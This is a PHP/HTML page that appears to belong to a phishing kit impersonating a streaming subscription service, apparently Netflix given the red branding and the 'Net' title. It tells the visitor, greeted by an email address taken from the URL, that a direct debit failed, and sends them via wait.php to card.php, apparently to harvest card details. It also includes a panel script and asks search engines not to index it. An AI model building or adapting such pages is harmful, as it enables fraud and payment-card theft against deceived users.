<?php
require '../auth/panel/center.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
    <link rel="stylesheet" href="res/css/account.css">
    <link rel="stylesheet" href="res/css/account-media.css">
    <link rel="icon" type="image/x-icon" href="res/img/logo.png">
    <title>Net</title>
</head>
<body style="background:url('res/img/back.jpg') center/cover no-repeat; color:#fff; font-family:'Segoe UI', Arial, sans-serif; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center;">

<div style="text-align:center; max-width:500px; padding:20px;">

    <div style="background:rgba(0,0,0,0.7); border-radius:8px; padding:30px;">
        <img src="res/img/shield.png" alt="shield" style="width:70px; margin-bottom:15px;">

        <h2 style="font-size:1.3em; font-weight:700; margin-bottom:15px;">Auto-renewal failure</h2>

        <p style="font-size:0.95em; line-height:1.6; color:#ccc; margin-bottom:15px;">
            Hello <strong><?php echo htmlspecialchars($_GET['email'] ?? 'User', ENT_QUOTES); ?></strong>,
            the last direct debit for your subscription failed. This may be related to the payment method used to pay for your subscription. Please re-enable direct debit so that you can continue to use our services.
        </p>

        <p style="font-size:0.9em; color:#aaa; margin-bottom:20px;">
            Click the button below to resume your subscription and reactivate direct debit.
        </p>

        <a href="wait.php?next=card.php" style="background:#E50914; color:#FFF; font-weight:700; text-align:center; border-radius:5px; font-size:15px; padding:12px; display:block; text-decoration:none;">Resume my subscription</a>
    </div>
</div>

</body>
</html>